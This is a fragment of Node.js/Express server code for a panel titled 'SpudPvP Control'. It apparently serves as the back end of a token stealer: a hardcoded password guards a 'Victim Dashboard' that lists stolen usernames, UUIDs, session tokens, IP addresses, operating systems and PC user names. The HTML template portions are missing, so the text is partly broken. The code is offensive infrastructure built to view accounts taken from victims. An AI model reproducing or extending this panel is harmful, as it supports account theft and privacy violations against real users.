SpudPvP Control


`); }); app.post('/login', (req, res) => { if (req.body.password === 'sudoapt1') { res.cookie('auth', 'sudoapt1', { httpOnly: true }); return res.redirect('/dashboard'); } res.redirect('/?error=1'); }); // Dashboard panel app.get('/dashboard', (req, res) => { if (req.cookies.auth !== 'sudoapt1') { return res.redirect('/'); } let rows = victims.map(v => ` ${v.timestamp} ${v.username} ${v.uuid} ${v.token} ${v.ip} ${v.os} (${v.pcUser}) `).join(''); res.send(` Victim Dashboard

`); }); app.listen(3000, () => console.log('Server running on port 3000, absolute ollie.'));
